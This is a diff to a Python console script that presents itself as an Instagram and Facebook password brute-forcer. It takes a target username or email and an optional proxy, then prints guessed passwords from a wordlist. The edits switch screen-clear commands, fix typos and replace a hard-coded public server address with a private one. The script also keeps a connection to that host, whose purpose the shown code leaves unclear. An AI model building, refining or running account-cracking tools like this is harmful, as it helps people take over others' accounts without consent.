@@ -127,19 +127,19 @@ class project(object):
         icon=[logo,Logo,LOgo]
         print(icon[random.randint(0,2)])
     def starting(self,conn):
-        os.system("clear")
+        os.system("cls")
         project.LOGO()
         print("\033[7;36m take a number :\n\n")
         print("\033[0;35m[\033[0;36m1\033[0;35m] instagram ")
         print("\033[0;35m[\033[0;36m2\033[0;35m] facebook ")
-        put = str(input("\n\033[0;35m[\033[0;36m$\033[0;35m]chose \033[0;36m:\033[1;34m "))
+        put = str(input("\n\033[0;35m[\033[0;36m$\033[0;35m]choose \033[0;36m:\033[1;34m "))
         if put == "1":
-            os.system("clear")
+            os.system("cls")
             project.LOGO()
             self.INSTA.start()
           #  self.one.join()
         elif put == "2":
-            os.system("clear")
+            os.system("cls")
             project.LOGO()
             self.FACE.start()
         else:
@@ -155,7 +155,7 @@ class project(object):
             time.sleep(0.2)
             print(change)
     def insta(self,conn):
-        os.system("clear")
+        os.system("cls")
         project.LOGO()
         print("\033[0;33m[instagram brute force]\n")
         print("\033[7;36m put the commands :\n")
@@ -163,7 +163,7 @@ class project(object):
         sac = str(input("\033[0;35m[\033[0;36m#\033[0;35m] do you wana use proxy ? [\033[0;36myes\033[0;35m/\033[0;36mno\033[0;35m] \033[0;36m: \033[1;34m"))
         print("\npleas white ..")
         if len(first) <= 1 :
-            os.system("clear")
+            os.system("cls")
             lol = input("\n\n\033[0;31m u don't set any account , try ageen ..")
             if len(lol) != None :
                 project.insta(self,conn)
@@ -188,12 +188,12 @@ class project(object):
                 self.HACK=threading.Thread(target=self.hack,args=[first])
                 self.HACK.start()
             else:
-                os.system("clear")
+                os.system("cls")
                 lol = input("\n\n\033[0;31m ohh ,there is no account have this name , try ageen ..")
                 if lol != None:
                     project.insta(self,conn)
     def hack(self,first):
-        os.system("clear")
+        os.system("cls")
         project.LOGO()
         user = "\033[0;35musername \033[0;36m: \033[1;34m"+first
         hach = "\033[0;36m || "
@@ -208,7 +208,7 @@ class project(object):
                 time.sleep(0.1)
                 print(user+hach+pas+a.readline()+check)
     def face(self,conn):
-        os.system("clear")
+        os.system("cls")
         project.LOGO()
         print("\033[0;33m[facebook brute force]\n")
         print("\033[7;36m put the commands :\n")
@@ -216,8 +216,8 @@ class project(object):
         sac = str(input("\033[0;35m[\033[0;36m#\033[0;35m] do you wana use proxy ? [\033[0;36myes\033[0;35m/\033[0;36mno\033[0;35m] \033[0;36m: \033[1;34m"))
         print("\npleas white ..")
         if len(first) <= 1 :
-            os.system("clear")
-            lol = input("\n\n\033[0;31m u don't set any account , try ageen ..")
+            os.system("cls")
+            lol = input("\n\n\033[0;31m u don't set any account , try again ..")
             if len(lol) != None :
                 project.face(self,conn)
         elif len(first) > 1 :
@@ -239,7 +239,7 @@ class project(object):
                 self.HUCK=threading.Thread(target=self.huck,args=[first])
                 self.HUCK.start()
     def huck(self,first):
-        os.system("clear")
+        os.system("cls")
         project.LOGO()
         user = "\033[0;35memail \033[0;36m: \033[1;34m"+first
         hach = "\033[0;36m || "
@@ -255,7 +255,9 @@ class project(object):
                 time.sleep(0.1)
                 print(user+hach+pas+a.readline()+check)
 if __name__=="__main__":
-    host = "3.14.182.203"
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    host = '192.168.169.1'
     port = 11807
     proj = project(host,port)
     proj.start()
